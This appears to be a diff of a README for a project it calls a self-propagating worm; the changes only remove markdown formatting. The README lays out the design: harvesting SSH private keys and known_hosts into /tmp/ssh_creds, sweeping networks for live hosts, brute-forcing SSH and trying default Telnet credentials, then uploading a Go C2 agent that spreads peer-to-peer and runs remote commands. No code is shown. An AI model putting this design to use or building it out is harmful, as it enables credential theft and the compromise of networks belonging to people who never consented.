@@ -17,7 +17,7 @@ This project implements a multi-component **self-propagating worm**, consisting 
 | Component | Role |
 |-----------|------|
 | **recon.py** | Reconnaissance module: gathers SSH credentials, scans the network, launches attack plugins |
-| **guid/*.py** | Technique plugins for remote access over **SSH** and **Telnet** |
+| **guid/.py** | Technique plugins for remote access over **SSH** and **Telnet** |
 | **agent.go** | Lightweight C2 agent: deploys on victims, enables peer-to-peer propagation & remote command execution |
 
 **P2P Module**
@@ -51,12 +51,12 @@ The script will automatically:
 
 | Function                               | Purpose                                                                                                                     |
 | -------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
-| **find_private_keys**              | Locate `~/.ssh/id_*` (excluding .pub), set 600, return paths                                                            |
-| **parse_known_hosts**              | Parse `~/.ssh/known_hosts`, ignore comments / hashes, return host list                                                      |
-| **copy_to_staging**            | Create `/tmp/ssh_creds`, copy keys, return new paths                                                                        |
-| **prepare_ssh_data**               | Aggregate keys & hosts → write `/tmp/ssh_creds/ssh_data.json`<br>Returns:<br>{"keys": [], "known_hosts": []}        |
-| **discover_hosts**                 | Find live hosts via:<br>• mDNS/Bonjour → `dns-sd -B _ssh._tcp`<br>• ARP + ping sweep                                        |
-| **load_creds_db(path="creds.json")** | Load `(user, password)` pairs from JSON;<br>append key-based creds for current user                                         |
+| **find_private_keys**              | Locate ~/.ssh/id_ (excluding .pub), set 600, return paths                                                            |
+| **parse_known_hosts**              | Parse ~/.ssh/known_hosts, ignore comments / hashes, return host list                                                      |
+| **copy_to_staging**            | Create /tmp/ssh_creds, copy keys, return new paths                                                                        |
+| **prepare_ssh_data**               | Aggregate keys & hosts → write /tmp/ssh_creds/ssh_data.json`<br>Returns:<br>{"keys": [], "known_hosts": []}        |
+| **discover_hosts**                 | Find live hosts via:<br>• mDNS/Bonjour → dns-sd -B _ssh._tcp`<br>• ARP + ping sweep                                        |
+| **load_creds_db(path="creds.json")** | Load user, password pairs from JSON;<br>append key-based creds for current user                                         |
 | **probe_ports**                  | Test ports **22, 23, 80, 445** with nc -z; return open list                                                               |
 | **main**                           | Orchestrates:<br>1 prepare_ssh_data() → 2 load_creds_db() → 3 discover_hosts() → 4 iterate hosts & techniques |
 
@@ -76,11 +76,11 @@ def execute(host, creds_db) -> bool
 | **SSHBruteForce**  | Targets port **22** → tries user/pass combos **&** SSH keys; on success, uploads & runs the payload/agent via SFTP |
 | **TelnetDefaults** | Targets port **23** → attempts default Telnet creds; on success, transfers the agent in Base64 and executes        |
 
-All are aggregated into **`ALL_TECHNIQUES`** for use by recon.py.
+All are aggregated into ALL_TECHNIQUES for use by recon.py.
 
 ---
 
-## Agent — `agent.go`
+## Agent — agent.go
 
 | Stage                | Behaviour                                                                                                                                                    |
 | -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
